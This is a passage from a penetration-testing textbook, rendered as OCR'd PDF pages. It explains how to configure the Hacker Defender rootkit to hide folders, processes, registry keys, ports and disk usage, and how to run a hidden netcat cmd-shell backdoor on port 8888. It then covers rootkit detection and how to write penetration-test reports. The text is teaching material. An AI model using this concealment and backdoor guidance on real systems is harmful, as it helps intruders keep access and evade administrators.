main files included with Hacker d efender that you must be aware of: hxdef100.exe, hxdef100.ini, and bdcli100.exe. Although the .zip file will include several other files, we will focus our attention on these three. Hxdef100.exe is the executable file that runs Hacker d efender on the target machine. Hxdef100.ini is the configuration file where we set up the options we want to use and list the programs, files, or services that we want to hide. Bdcli100.exe is the client software that is used to connect directly to Hacker d efender’s backdoor. o nce you have uploaded the hsdef100.zip file to your target, you will need to unzip it. to keep things as simple as possible, it is best to create a single folder on the root of the target drive. for the purpose of this example, we will create a folder on the c :\\ drive called “rk” (for rootkit). All the files including the hxdef100.zip and its uncompressed contents are placed into this single folder. t his will make it easier to keep track of the files, provide a central location to upload additional tools to, and make hiding this central repository much easier. o nce you have unzipped the hxdef100 file, you can begin configuring Hacker defender by modifying the hxdef100.ini file. o nce you open the .ini file, you will see a number of different sections. e ach major section begins with a name enclosed in a square bracket. f igure 6.7 shows an example of the default configuration file. f IGURE 6.7 Screenshot of the hxdef100.ini Configuration File."},{"pageNumber":157,"pageContent":"The Basics of hacking and penetration T esting 138 As you can see in fi gure 6.7, there are several headings including [Hidden ta ble], [Hidden Processes], [ ro ot Processes], [Hidden se rvices], and others. You will also notice that Hacker de fender configuration file includes a cou- ple of default entries. th ese entries are used to hide the Hacker de fender files and built in backdoor so you do not have to modify these or make additional changes. no tice too that the .ini file supports the use of wildcards with the “*” character. in this case, any file that starts with the letters hxdef will automati- cally be included in the list. s tart at the top and work your way through each of the headings. t he first sec- tion is titled [Hidden table]. Any files, directories, or folders listed under this heading will be hidden from the explorer and file manager used by w indows. i f you created a folder on the root of the drive as suggested earlier, be sure to list it here. Building off of this previous example, we will list “rk” in the [Hidden t able] section. i n the [Hidden Processes] section, you list each of the processes or programs you want to be concealed from the user. e ach of the processes listed here will be hidden from the local user when they view currently running processes with the task manager. As a nonmalicious example assume you want to hide the cal- culator program. i n this case you will need to list the calculator program under the [Hidden Processes] section. By adding calc.exe to the [Hidden Processes] section, the user will no longer be able to find or interact with the calculator program. o nce our rootkit is started, as far as the user is concerned, there is no calculator program available on the computer. t he [ r oot Processes] section is used to allow programs to interact with and view the previously hidden folders and processes. remember that in the pre- vious sections we were removing the computer’s ability to detect, see, and interact with various files and programs. i n this section, we list any programs that we want to have full control. Any programs listed here will be allowed to view and interact with programs on the system, including those listed in the [Hidden t able] and [Hidden Processes] tab . i f you have any programs that will install as a service or run services like ft P, web servers, backdoors, etc., you will need to list them in the [Hidden s ervices] section. l ike each of the other sections, the [Hidden s ervices] section will hide each of the listed services. Again, when interacting with the task manager, any program listed here will be concealed from the “services” list. You can use the [Hidden reg k ey s] to hide specific registry keys. Almost all pro- grams create registry keys when they are installed or run on a computer. t he [Hidden reg k ey s] section can be used to camouflage each of these keys. You will need to make sure that you list them all in order to avoid detection. s ome instances require more granular control than simply hiding the entire key. i f an entire key is missing (or hidden), a keen system administrator may get suspicious. to handle these instances, Hacker d efender allows us to use"},{"pageNumber":158,"pageContent":"Maintaining Access with Backdoors and Rootkits C h A p TER 6 139 the [Hidden r egValues]. e ntering information here will hide individual values rather than the entire key. t he [ s tartup r un] is a list of programs that will be automatically run once Hacker d efender has been started. t his would be a good place to list the n etcat command if you were interested in creating a backdoor. Just make sure you put it in listener mode! Just as installing programs on a w indo ws machine automatically creates regis- try keys and values, installing programs onto a target requires disk drive space. Here again, a cunning administrator may notice if you install a program that requires lot of disk space. i f a user starts his or her computer one morning and discovers that over half of the hard drive space is suddenly in use, he or she will probably become suspicious. You can use the [ f ree s pace] section to force the computer to “add back” the amount of free space that you used. e ntering a number here will force the computer to report the actual available free space plus the number you enter in this section. i n other words, if you install a pro- gram that requires 1 g B of free space, you should add 1073741824 under the [ f ree s pace] heading. d oing so will lessen the likelihood of discovery. Please note, this number is listed in bytes. i f you need help in converting from bytes to kilobytes to megabytes to gigabytes, there are several good calculators avail- able online. s imply g oogle “kilobytes to megabytes calculator” and use one of the suggested pages returned. i f you know of ports that you plan to open, you can list them under the [Hidden Ports] section. You will notice this section is further divided with the following entries: tc P i :, tc P o , U d P . t he “ t c P i :” subsection is where you list any inbound ports that you want hidden. i f you have multiple ports to list, simply separate them by a comma. “ t c P o :” is a section where you list any out- bound tc P ports that you want to be hidden from the user. t he “U d P:” sec- tion is used to specify any U d P ports that y ou want concealed. n o w that you have an idea of how to configure the basic Hacker d efender settings , let us examine the tool in action. f or this example, we will install Hacker d efender in a folder on the c :\\ drive called “rk.” w e will also place a copy of n etcat into this folder. f igure 6.8 shows an example of the .ini configu- ration file. You will notice that only a few extra lines have been added to the default configuration file. i n this example, we have added the “rk” folder to the [Hidden t able] section, the n etcat executable to the [Hidden Processes] sec- tion, and lastly set up n etcat to automatically start up in server mode and provide a cmd shell on port 8888 of the target. i f you wanted to add an additional layer of stealth, you could also add 8888 to the [Hidden Ports] section. f igure 6.9 shows two screenshots prior to starting Hacker d efender . n otice that both the “rk” folder and the n etcat (nc.exe) program are visible . D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":159,"pageContent":"The Basics of hacking and penetration T esting 140 However, once the hxdef100.exe file has been executed, the rootkit is in full force. f igure 6.10 demonstrates that neither the “rk” folder nor the “nc.exe” program is visible to the user. As you can see, even a simple rootkit like Hacker d efender is quite capable of masking and hiding files. rootkits are a vast topic and we could easily dedicate f IGURE 6.9 Prior to Running the Rootkit Both Folder and Program Are Visible. f IGURE 6.8 Newly Configured hxdef100.ini File."},{"pageNumber":160,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 141 an entire book to the technical details and their makeup and inner workings. rootkit technology, like all malware, continues to develop at a staggering pace. i n order to truly master rootkits you will need to begin with a solid under- standing of the operating system kernel. o nce you finish covering the basics, you are highly encouraged to dive into the malware rabbit hole and see just how deep it goes. DETECTING AND DE fENDING AGAINST ROOTKITS let us break from the normal convention of this book and take a minute to discuss a few defensive strategies for dealing with rootkits. Because we are focusing on the basics, defending against many of the techniques covered in the earlier step has been quite simple: n c losely monitor the information you put onto the internet. n Properly configure y our firewall and other access control lists. n P atch your systems. n i nstall and use antivirus software. n m ake use of an intrusion detection system. Although the list is not nearly complete, it is a good starting point for defend- ing systems. However, even with all of those processes in place, rootkits can still pose a danger. de fending against and detecting rootkits takes a few extra steps. it is impor- tant to understand that in order to configure and install a rootkit, adminis- trative access is required. so the first step in avoiding rootkits is to deprivilege your users. it is not uncommon to find networks that are loaded with wi ndows f IGURE 6.10 After Running the Rootkit Both Folder and Program Are Invisible."},{"pageNumber":161,"pageContent":"The Basics of hacking and penetration T esting 142 machines where every user is a member of the administrator group. Usually when inquiring as to why every user is an administrator, the system admins sim- ply just shrug or provide some lame excuse about the user needing to be admin- istrators to run a particular piece of software. re ally? co me on, this is not 1998. th ere are very few legitimate reasons for allowing your users to run around with full admin rights. wi th most modern operating systems, you have the ability to temporarily elevate your privileges with the “su” or “ ru n As” commands. Although it is true that many rootkits function at the kernel level and have the ability to avoid detection by antivirus software, installing, using, and keeping the software up-to-date is critical. so me rootkits, especially the older and less sophis- ticated versions can be detected and cleaned by modern antivirus software. m onitor the traffic coming into and going out of your network. m any adminis- trators are great at monitoring and blocking traffic as it flows into the network. t hey spend days and even weeks honing their rule sets to block incoming traf- fic. At the same time, many of these admins completely ignore all outbound traffic. t hey become so focused on the incoming traffic that they forget to watch what is leaving. m onitoring outbound traffic can be vital in detecting rootkits and other malware. Another good tactic for detecting rootkits and backdoors is to regularly port scans your systems. ma ke note of each open port on each of your systems. if y ou find a system with an unknown port open, be sure to track down the P c and identify the rogue service. tools like rootkit rev ealer, Vice, and f -secure’s Blacklight are some great free options for revealing the presence of hidden files and rootkits. Unfortunately, once a rootkit has been installed, it can be very difficult to remove, or at least to remove completely. s ometimes, rootkit removal requires you to boot your machine into an alternate operating system and mount your original hard drive. By booting your machine to an alternate operating system or mounting the drive to another machine, you can scan the drive more thoroughly. Because the original operating system will not be running and your scanner will not be using AP i calls to an infected system, it is more likely you will be able to dis- cover and remove the rootkit. e ven with all of this, oftentimes your best bet is to simply wipe the system, including a full format, and start over. hOW DO I p RACTICE ThIS STE p? like each of the steps that have been discussed, becoming proficient with backdoors and rootkits requires practice. working with tools like n etcat can seem a bit confusing at first, especially when we use the “-e” switch to provide backdoor functionality. t he best way to practice this technique is to set up two machines and practice implementing n etcat between them. t he more you use n etcat, the more comfortable you will become with the concept. You should practice both sending and receiving files from each machine. i t is important to understand directionality and exactly how to use n etcat to"},{"pageNumber":162,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 143 perform this task both ways (download and uploading). o nce the basics of sending and receiving files have been mastered, begin focusing on using n etcat as a backdoor. remember the “-e” switch is vital in performing this task. f ully understanding how to implement n etcat as a backdoor will require setting up the tool in listener mode on the target and making a connection to it from the attacker machine. Be sure to practice setting up a backdoor and establishing a connection with both l inux and w indows. i t is important to master the difference between the l inux and w indows versions. remember , a w indows n etcat version can con- nect to a l inux version and vice versa; however, there are several minor differ- ences in the switches and functionality of each program. fi nally, after becoming proficient with the basics of ne tcat, be sure to explore some advanced features like using ne tcat as a proxy, reverse shells, port scan- ning, creating and copying a disk partition image, and chaining ne tcat instances together to bounce traffic from one machine to another. Before wrapping up n etcat, be sure to thoroughly review the “man” pages and examine each switch. Again, you will want to look closely at the differences between the l inux and w indows versions. e xamining the switches and reading the “man” pages often provides additional information and can spur some cre- ative uses of the tool. Practicing with rootkits can be a bit of a double-edged sword. e xploring and learning to use rootkits can be rewarding and valuable but as with all malware there is certainly some risk involved. Anytime malware is used or studied, there is a chance that the malware will escape or infect the host system. readers are strongly encouraged to exercise extreme caution before downloading or install- ing any type of malware. Advanced malware and rootkit analysis is beyond the scope of this book and is not recommended. i f you are still compelled to study these topics, the use of a sandboxed envi- ronment and virtual machines is a must. Always disconnect all outside access before proceeding to ensure that nothing escapes your network. remember that you are legally responsible for any and all traffic that leaves your network. t he laws that govern computer use at the federal and state levels make no dis- tinction between traffic that “accidentally” leaves your network and traffic that is sent on purpose. i n reality, rootkits and backdoors are rarely used in a penetration test. i t is highly suggested that you focus on mastering each of the other steps before attempting to advance any further with malware. Wh ERE DO I GO fROM hERE ? After mastering the basics of backdoors and rootkits, you should expand your horizon by exploring similar tools including n cat and s ocat. n cat is a modern- ized version of the original n etcat tool and is included as part of the n map"},{"pageNumber":163,"pageContent":"The Basics of hacking and penetration T esting 144 project. n cat improves on the original tool by including many of the original features plus ssl and i Pv6 support. s ocat is another close n etcat relative that is great for reading and writing network traffic. s ocat also extends the origi- nal functionality of n etcat by adding support for ssl , i Pv6, and several other advanced features. i f you are interested in learning more about backdoors, you should spend time exploring a couple of classic examples including Back o rifice and s ubseven (sub7). Back o rifice is similar in nature to n etbus and allows a user to com- mand and control a remote machine. t he program was originally released by s ir d ystic in 1998. You can listen to the original talk titled “ cult of the d ead c ow: t he announcement of Back o rfice, d irectxploit, and the modular ButtPlugins for B o” by reviewing the defcon 6 media archives. s ub7 was originally released in 1999 by m obman and functions in a client/ server manner similar to n etbus and Back o rifice. l ike each of the other tools discussed in this chapter, s ub7 is software that allows a client to remotely con- trol a server. o ne interesting point about s ub7 is the fact that after a six-year hiatus, where no development occurred, the project was revived and updated. i f you are interested in expanding your knowledge of rootkits, it is important to study and master the inner workings of modern operating systems. l earning the intricate details of an operating system kernel may seem daunting at first, but it is well worth your time. t his chapter examined the Hacker d efender rootkit and provided a basic over- view of the functionality and use of rootkits. i t is important to understand that this material only scratches the surface of rootkits. Advanced topics include hooking system and function calls and understanding the difference between user-mode and kernel-mode kits. d eveloping a solid grasp of system program- ming and programming languages can be extremely beneficial as well. SUMMAR y this chapter focused on the use and implementation of backdoors and root- kits . remember it is vital that you have proper authorization before utilizing a rootkit or backdoor in a penetration test. t his chapter began by introduc- ing the powerful and flexible tool n etcat. s everal uses of n etcat, including implementing n etcat as a backdoor, are covered. c ryptcat, a modern version of n etcat with the added ability to encrypt traffic between two machines, was also discussed. t he classic remote control program n etbus was introduced to demonstrate the power of “command and control” software. t he chapter con- cluded with a brief overview of rootkits including their basic structure and use. s pecifically, the proper use, configuration, and implementation of the Hacker d efender rootkit was covered."},{"pageNumber":164,"pageContent":"145 INTRODUCTION many people assume that once you have completed each of the four steps out- lined in c hapters 2–6 on your target, the penetration test is over. m any new- comers also assume that immediately following step 4, you can simply call the client to discuss your findings or maybe even just send the client a bill for your services. Unfortunately, that is not the case. t he reality is that once you wrap up the technical details of a penetration test, there is still one task remaining. After all of the reconnaissance, scanning, exploitation, and maintaining access is complete, you need to summarize your findings in the form of a penetration testing report. i t is not uncommon to find extremely gifted hackers and penetration testers who want to completely ignore this phase. t hese people have the skill and the ability to compromise nearly any network, but they lack the skills to commu- nicate the vulnerabilities, exploits, and mitigations to the client. i n many respects, writing the penetration testing report is one of the most criti- cal tasks that an ethical hacker performs. i t is important to remember that in many cases, the better you do your job as a penetration tester, the less your cli- ent will actually notice or “feel” your work. As a result, the final report is often the only tangible evidence that a client will receive from the penetration tester and the P t process. Wrapping Up the penetration T est ChApTER 7 Information in This Chapter: n Writing the P enetration Testing Report n Y ou Do Not Have to Go Home But You Cannot Stay Here n Where Do I Go F rom Here? n Wrap Up n The Circle of Life"},{"pageNumber":165,"pageContent":"The Basics of hacking and penetration T esting 146 th e penetration testing report often becomes the face of your organization and reputation. on ce the initial contract has been signed providing scope and authorization, the penetration tester often disappears from the target organiza- tion. th e test itself occurs in a relatively isolated environment. on ce the test is completed, it is critical that the penetration tester present his or her findings in a well thought-out, organized, and easy-to-understand manner. Again, it is important to remember that in most cases the target organization (the com- pany that is paying you) has no concept of what you have been doing or how many hours you have put into the task. As a result, the penetration testing report becomes the principal reflection of your competence. You have a respon- sibility to the client to present your findings, but you also have an opportunity to showcase your talent and explain how you spent the client’s time and money wisely. d o not underestimate the power or importance of this phase. i n reality often- times your perceived efforts and success will be judged based more on your report than your actual success or failure to compromise a network. Ultimately, the ability to write a good penetration testing report will win you repeat business. WRITING ThE pENETRATION TESTING RE pORT like every other topic we have discussed, writing a good penetration test- ing report takes practice. m any penetration testers mistakenly think that they can simply provide the raw output from the tools that they run. t his group of people will often collect and neatly organize the various outputs into a single report. t hey will gather any pertinent information from the reconnaissance phase and include it along with the output from nmap and nessus. m any of the tools we discussed in this book include a reporting engine. for example , n essus has several prebuilt reports that can be generated based off of the scan. Unfortunately, using the prebuilt reports is not enough. e ach report must be well laid out and flow as a single document. c ombining one style of report from n essus with a different style of report from n map or m etasploit will make the penetration test report appear disjointed and unorganized. w ith that being said, it is important to provide the detailed output from each of your tools. n ot many of your clients will have the ability to understand the technical output from n map or n essus; however, remember the data does belong to the client and it is important that they have access to the raw data. we have covered several examples of what not to do in a penetration test- ing report; let us look at it from a different angle and discuss what should be done. f irst and foremost, the penetration testing report needs to be broken into several individual pieces. taken together, these pieces will form your overall report, but each piece should work as a stand-alone report as well."},{"pageNumber":166,"pageContent":"Wrapping Up the penetration T est ChApTER 7 147 At a minimum, a well-rounded and presented penetration testing report should include the following: 1. An executiv e summary 2. A detailed report 3. r a w output Executive Summary the executive summary should be a very brief overview of your major findings. t his document, or subreport, should not exceed two pages in length and only include the highlights of the penetration test. t he executive summary does not provide technical details or terminology. t his report needs to be written in the context of board members and nontechnical management so that they can understand your findings and any major concerns you discovered on the net- work and systems. i f vulnerability and exploits were discovered, the executive summary needs to focus on explaining how these findings impact the business. t he executive summary should provide links and references to the detailed report so that interested parties can review the technical nature of the findings. i t is impor- tant to remember that the executive summary must be very brief and written at a high level. m ost executive summaries should be written in such a way that that the report writer’s own grandmother would be able to understand what occurred during the penetration test and what the major findings w ere. Detailed Report the second part in a well-rounded penetration testing report is the detailed report. t his report will include a comprehensive list of your findings as well as the technical details. t he audience for this report includes it managers, security experts, network administrators, and others who possess the skills and knowledge required to read and comprehend its technical nature. i n most cases, this report will be used by the technical staff to understand the details of what your test uncovered and how to address or fix these issues. As with every facet of the penetration test, it is important to be honest and direct with the client. Although it may be tempting to emphasize your great technical savvy and discuss how you owned a particular service, it is much more important to present the facts to your client beginning with the issues that pose the most danger to their networks and systems. ra nking the discovered vulnera- bilities can be confusing and daunting for a new penetration tester, luckily most tools like ne ssus will provide you with a default ranking system. Always present critical findings first. th is makes your penetration test easier to read and allows the client to read about and take action on the most serious findings first (with- out having to dig through 50 pages of technical output). Because it is important it needs to be stated again, it is imperative that you put the needs of the client before your ego. co nsider the following example: assume"},{"pageNumber":167,"pageContent":"The Basics of hacking and penetration T esting 148 you are conducting a penetration test and are able to fully compromise a server on your target’s network. However, after further investigation and review, you determine that the newly compromised system is of no value. th at is, it holds no data, is not connected to any other systems, and cannot be used to gain further access to the network. la ter in the penetration test, one of your tools reports a critical vulnerability on a boarder router. Unfortunately, even after having read the details of the vulnerability and running several tools, you are unable to exploit the weakness and gain access to the system. ev en though you are unable to gain access to the boarder router, you are certain that the system is vulnerable. You also know that because this device is a boarder router, if it is compromised the entire network will be at risk. of course it should go without saying that in this example both of these flaws should be reported. However, the point is that in this case one flaw clearly presents more danger than the other. in this situation, many newcomers may be tempted to showcase their technical skills and successes by emphasizing the fact that they were able to successfully compromise a server and downplay the importance of the critical vulnerability because the penetration tester was unable to exploit it. ne ver put yourself or your ego above the security of your clients. do not overstate the facts; simply report your findings to the best of your ability in an objective manner. le t them make subjective decisions with the data you provide. ne ver make up or falsify data in a penetration test. ne ver reuse “proof-of-concept” screenshots. it can be tempting to take shortcuts by supply- ing generic, reusable proofs, but it is a dangerous and unethical thing to do. t he idea and use of proof-of-concept screenshots is a powerful tool and should be incorporated into the penetration testing report whenever possible. Anytime you discover a major finding or successfully complete an exploit, you should include a screenshot in the detailed report. t his will serve as undeniable evi- dence and provide the reader with a visualization of your success. it is also good to remember, especially when you first start conducting penetra- tion tests, that not every P t will result in a “win” or the successful compromise of your target. in most situations, the penetration test is bound by some artifi- cial rules that reduce the reality of the test. th ese include the demands imposed by the client such as scope, time, and budget as well as the legal and ethical restrictions that help define the boundaries of a penetration test. As you prog- ress in your penetration testing career, you will undoubtedly encounter situa- tions where your penetration test turns up completely blank, no vulnerabilities, no weaknesses, no useful information gathered, etc. in these situations, you still need to complete the penetration testing report. in these situations, the raw tool output will provide the bulk of your report. wh enever possible, when writing the detailed penetration testing report, you should include mitigations and suggestions for addressing the issues you dis- covered. so me tools, like ne ssus, will provide suggested mitigations. if your tools do not provide precanned mitigations, then it is important that you locate potential solutions on your own. if you are unsure of where to look for"},{"pageNumber":168,"pageContent":"Wrapping Up the penetration T est ChApTER 7 149 these solutions, most public exploits and vulnerabilities include details or steps that can be taken to address the weakness. Use go ogle and the in ternet to track down specifics of the reported weaknesses. By reviewing the technical details of a vulnerability, you will often find potential solutions. th ese typically include downloading a patch or upgrading to a newer version of the software, although they may discuss other resolutions such as configuration changes or hardware upgrades. Providing solutions to each of the problems you discover is a vital part of the detailed report. i t will also serve to win you repeat business and help to distin- guish yourself from other penetration testers. t he findings in the detailed report should also include links and references to specific pages in the raw output section. t his is important because it will save you time and confused phone calls from your clients who are wondering how you discovered a particular issue. Providing clear references to the raw tool out- put will allow the client to dig into the details without needing to contact you. i n this manner, you should be able to see how the report flows from executive summary to detailed summary to raw output. Raw Output the final portion of the report should be the technical details and raw out- put from each of the tools. i n reality, not every penetration tester will agree that this information needs to be included with the penetration testing report. t here is some merit to the arguments against including this detailed informa- tion, which includes the fact that this information is often hundreds of pages in length and can be very difficult to read and review. Another common argu- ment often repeated from fellow penetration testers is that providing this level of detail is unnecessary and allows the client to see exactly what tools were run to perform the penetration test. if you are using custom tools, scripts, or other proprietary code to perform a penetration test, you may not want to reveal this type of information directly to your client. However, in most cases, it is usually safe to provide the direct output of the tools used in the penetration test. th is is not to say that you need to provide the detailed commands and switches that were used to run tools like me tasploit, nm ap, or custom code, but rather that you make the output of those commands available. if you are concerned about disclosing the specific commands used to run your tools, you may have to sanitize the raw output to remove those commands and manually delete any other sensitive information you do not want to be disclosed to the readers. f rom the view point of a basic penetration test, which typically includes each of the tools we discussed in this book, it would not be out of the question to simply include all the raw output at the end of the report. t he reason for this is simple—the tools and commands used to invoke each of the tools in a basic penetration test are widely known and available. t here is no real point in hiding or attempting to obfuscate this information. Additionally, as mentioned"},{"pageNumber":169,"pageContent":"The Basics of h acking and p enetration Testing 150 earlier, including the detailed output and making clear references to it in the detailed report will often save you time and phone calls from frustrated clients who do not understand your findings. w hether you decide to include the raw data as an actual component of the report or you decide to include it as a separate document is entirely up to you. d epending on the sheer size of this report, you may want to simply include it as a secondary or stand-alone report and not attach it directly with the execu- tive summary and the detailed reports. Another consideration that needs to be given some careful thought is how you will present your report to the client. t his is something that should be discussed prior to the delivery of the report. f rom a purely time-management and resource standpoint, it is often easiest to deliver the report as an electronic document. i n the case where the client requests a paper copy, you will need to professionally print, bind, and mail the document to the client. Be sure to send the document via certified mail and always request a return receipt so you can verify that the document was properly received. i f you have agreed to deliver the document electronically, you will need to ensure that the penetration testing report is encrypted and remains confiden- tial until it arrives in the client’s hands. r emember a penetration testing report often contains very sensitive information about the organization. You must ensure the information contained in the report remains private. i t would be very embarrassing to have a report you created become public because you did not take the basic measures needed to ensure confidentiality. t he re are several easy ways of ensuring confidentiality. You can use a tool like 7zip to compress and add a password to the files. A much better way of encrypting a document is to use a tool like t ru e c ry pt to encrypt the docu- ments. t ru e c ry pt is an easy-to-use program and can be downloaded for free from: http://www.truecrypt.org. r eg ardless of what type of encryption or pro- tection scheme you use, your client will need to use the same tool to decrypt and view the files. t hi s is an arrangement that should be agreed upon before the penetration test begins. s om e of your clients may not understand even the basics of cryptography. As a result, you may need to work with and train them on the proper techniques needed to view your final report. e ach section or individual subreport should be clearly labeled and should begin on a new page. Under the heading of each report, it may be a good idea to emphasize to the reader that the penetration test is only a snapshot in time. t he security of networks, computers, systems, and software is dynamic. t hreats and vulnerabilities change at lightning speed. As a result, a system that appears completely impenetrable today can be easily compromised tomorrow if a new vulnerability is discovered. As a way of indemnifying yourself against this rapid change, it is important to communicate that the results of the test are accu- rate as of the day you completed the assessment. s etting realistic client expecta- tions is important. r emember, unless you fill a computer with concrete, drop D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":170,"pageContent":"Wrapping Up the penetration T est ChApTER 7 151 it in the middle of the ocean, and unplug it from the i nternet, there is always a chance that the system can be hacked by some unknown technique or new 0-day flaw. fi nally, take your time to prepare, read, reread, and properly edit your report. it is equally as important to provide a document that is technically accurate as well as one that is free of spelling and grammar issues. te chnical penetration testing reports that contain grammar and spelling mistakes will indicate to your client that you perform sloppy work and reflect negatively on you. re member the penetration testing report is a direct reflection of you and your ability. in m any cases, the report is the single output that your client will see from your efforts. You will be judged based on the level of its technical detail and findings as well as its overall presentation and readability. w hile you are reviewing your report for mistakes, take some time to closely review the detailed output from your various tools. remember , many of the tools that we use are written by hackers with a sense of humor. Unfortunately, hacker humor and the professional world do not always mesh. w hen i first started as penetration tester, a colleague and i found ourselves in an embarrass- ing situation. o ne of the tools that we were using had attempted to log into a particular service several hundred times using the name “Peter weiner .” As a result, our professional-looking report was filled with examples of a not-so- professional user account belonging to Peter weiner . i t is not easy to go into a boardroom full of professional, suit-wearing executives and discuss your ficti- tious user named Peter w einer . i t is worth noting that in this case, the mistake was 100 percent mine. t he maker of the tool clearly discussed how to change this username in the con- figuration settings. A more careful inspection of the reports would have caught this before my presentation and given me time to correct it. ri ght or wrong, your reputation as a penetration tester will have a direct cor- relation to the quality of the reports that you put out. le arning to craft a well-written penetration test is critical for earning repeat customers and earn- ing future business. it is always a good idea to have a sample report in hand. ma ny prospective clients will ask for a sample report before making a final decision. it is worth noting that a sample report should be just a sample. it s hould not include any actual data from a real customer. ne ver give a previous client’s report out as a sample, as this could represent a massive violation of the implied or contractual confidentiality between you and your client. to wrap up the report writing phase, it is worth mentioning that most clients will expect you to be available after the report has been delivered. Because of the technical and detailed nature of the penetration testing process and report, you should expect to receive a few questions. Here again, taking time and answering each question should be viewed as an opportunity to impress the client and win future business rather than as an annoyance. Ultimately, good customer service is worth its weight in gold and will often repay you 10-fold."},{"pageNumber":171,"pageContent":"The Basics of hacking and penetration T esting 152 na turally, your willingness to work with a client and provide additional services has to make business sense as well. You are not required to “overservice” the account and provide endless hours of free support, but rather you need to find a balance between providing exceptional customer service and healthy profits. yOU DON ’T hAv E TO GO hOME BUT yOU CAN ’T STA y h ERE Assuming you have read the entire book (congrats by the way!), you are prob- ably wondering “what’s next?” t he answer to that question depends entirely on you. f irst, it is suggested that you practice and master the basic informa- tion and techniques presented in this book. o nce you are comfortable with the basics, move onto the advanced topics and tools covered in the “ where d o i g o from Here” section of each chapter. After mastering all the material in this book, you should have a solid under- standing of the hacking and penetration testing process. You should feel comfortable enough with the basic information that you are able to take on advanced topics and even specialize. i t is worth noting, however, that there is much more to hacking and penetra- tion testing than just running tools. t here are entire communities out there that are built around these topics. You should become active in these com- munities. i ntroduce yourself and learn by asking questions and observing. You should give back to these communities whenever possible. Hacking, security, and penetration testing communities are available through various websites, online forums, icQ, mailing lists, and news groups, and even in person. c hat rooms are a great place to learn more about security. c hat rooms are usu- ally highly focused on a single topic and, as the name implies, typically involve lots of communication over a wide variety of subtopics pertaining to the over- all theme of the room. i n many respects, a chat room is like sitting at a bar and listening to the conversations around you. You can participate by asking ques- tions or simply by sitting quietly and reading the conversations of everyone in the room. if you have never been to a security conference (also known as a “ c on ” ), you owe it to yourself to go. de fcon is an annual hacker convention held in la s Vegas at the end of each summer. Yes it is a bit of a circus, yes there are more than 11,000 people attending, and yes it is hot in la s Vegas in August. But despite all that, de fcon remains one of the single best security communities on earth. in general the crowds are very pleasant, the go ons (official de fcon workers) are friendly and helpful, and the community is open and inviting. th e price of admission is peanuts compared to some of the other security events, and one more thing—the talks are amazing . t he quality and variety of talks at d efcon are nothing short of mind boggling. talks vary each year, but they are sure to include the topics of network hacking, web app security, physical security, hardware hacking, lock picking, and many"},{"pageNumber":172,"pageContent":"Wrapping Up the penetration T est ChApTER 7 153 more. t he speakers are not only approachable, more often than not they are willing to take time and talk to you, answering your questions one on one. i t is consistently amazing how approachable and helpful con speakers are. i t is natural to be a little nervous when approaching someone at a conference, especially if you have been part of an online community where “newbies” are put down and questions are discouraged; however, if you take the initiative, you will often be pleasantly surprised by the openness of the entire d efcon community. i f you cannot make it to the official d efcon conference, you should try to get involved in other security communities that are closer to you. i nfragard, o w A sP, the Backtrack- linux forums, and many others are great resources for you. reading this book and joining a security community are great ways to expand your horizons and learn additional and advanced security concepts. follo wing a thread or seeing a talk will often spur an interest in a specific security topic. o nce you have mastered the basics, you can look at diving more deeply into a particular area of security. m ost people learn the basics, then tend to special- ize in a particular area. t his is not something you have to choose today, and becoming specialized in a single area does not preclude you from becoming specialized in other areas. However, in general, most people tend to be highly focused with an advanced knowledge in one or two areas of security. t he list below is just a small sample of topics that you can specialize in. i t is not meant to be all-inclusive but rather to provide you with a sample of the various areas that require advanced training: n o ffensive security/ ethical Hacking n w eb Application security n s ystem security n r ev erse engineering n t ool development n m alware Analysis n d efensive security n s oftware security n d igital forensics n w ireless security Wh ERE DO I GO fROM hERE ? After reading this book, you may be hungry to learn more about a particular topic, step, or technique that was discussed. n ow that you have mastered the basics, there should be many additional doors open to you. i f you have truly studied, practiced, and understood the basic material presented in this book, you are equipped to tackle more advanced training. remember one of the main motivations for writing a book like this was not to turn you into an elite hacker or penetration tester but rather to provide you"},{"pageNumber":173,"pageContent":"The Basics of hacking and penetration T esting 154 with a springboard for advancing your knowledge. w ith a firm understand- ing of the basics, you should feel confident and prepared to take on advanced training in any of the areas we discussed. t here are many opportunities for you to take your skill to the next level. if you enjoyed learning by reading this book, sy ngress has a series of truly amaz- ing hacking books over a wide range of topics including (listed alphabetically) n A ggressive Network Self-Defense : by ne il r. wy ler, Bruce Potter, and ch ris Hurley n A Guide to K ernel Exploitation : by enrico Perla, massimiliano oldani n Managed Code R ootkits : by erez metula n Nessus Network A uditing : by russ rogers n Ninja Hacking : by thomas wilhelm and Jason Andress n P enTester’s Open Source Tookit : by Jeremy faircloth, c hris Hurley, and Jesse Varsalone n Pr ofessional Penetration Testing : by thomas wilhelm n Seven Deadliest A ttack Series l S even Deadliest Microsoft Attacks : by ro b kr aus, Brian Barber, mi ke Borkin, and na omi Alpern l Seven Deadliest Network Attacks : by s tacy Prowell, rob k raus, and m ike Borkin l Seven Deadliest Social Network A ttacks : by carl timm and richard Perez l Seven Deadliest Unified Communications A ttacks : by dan York l Seven Deadliest USB A ttacks : by Brian Anderson and Barbara Anderson l Seven Deadliest W eb Application Attacks : by mike shema l Seven Deadliest Wir eless Technologies Attacks : by Brad Haines n Stealing the Network: The Complete Series : by Johnny l ong, ry an russell, and t imothy mullen i f you are interested in a more “hands-on” learning approach, there are many great two- to five-day security boot camps available to you. t hese classes are often expensive and very labor-intensive, but often highly worth their price of admission. t he Black Hat conference usually offers a series of highly special- ized and focused classes delivered by some of the most well-known names in security today. t here are literally dozens of security topics and specializations to choose from at these events. t he trainings change from year to year, but you can find them on the Black Hat website at: http://www.blackhat.com t he crew responsible for creating and distributing Backtrack l inux also offer a hands-on highly intense series of classes. t hese classes will challenge you and push you by making you work through a series of realistic scenarios. ev en traditional universities are beginning to get into the security mode today. Just a few years ago, it was difficult to find any security-related cur- riculum. no w most universities offer at least one class or devote time during a class to cover some security. da kota st ate University in ma dison, s d, offers an entire Bachelor’s de gree in co mputer and ne twork se curity along with a ma ster’s de gree in in formation Assurance and a do ctorate of sc ience with a sp ecialization in in formation Assurance."},{"pageNumber":174,"pageContent":"Wrapping Up the penetration T est ChApTER 7 155 if you are interested in pursuing a security-related degree through a higher education institution, you are highly encouraged to attend an ns A-accredited c enter of Academic e xcellence. t hese programs are information assurance education degrees that have undergone a designation by the n 